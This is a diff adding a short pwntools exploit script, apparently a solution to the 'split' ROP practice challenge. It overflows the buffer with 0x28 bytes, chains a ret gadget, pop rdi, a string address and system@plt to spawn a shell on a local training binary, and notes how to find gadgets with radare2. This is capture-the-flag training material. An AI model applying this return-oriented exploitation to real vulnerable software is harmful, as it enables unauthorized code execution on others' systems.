@@ -1,0 +1,14 @@
+This binary involves the creation of rop chain and since its a 64-bit it involves registers
+
+from pwn import *
+
+elf= ELF("./split")
+p=process(elf.path)
+
+print(p.recv())
+# payload = offset + main_ret_addr + pop_rdi + bin_sh_addr + system.plt_addr
+# search for remote in radare2 using r2 in linux
+# /R pop rdi <=========== command on radere2
+payload = b'a' * 0x28 + p64(0x4006e7) + p64(0x4007c3) +p64(0x601060) + p64(0x400560)
+p.sendline(payload)
+p.interactive()
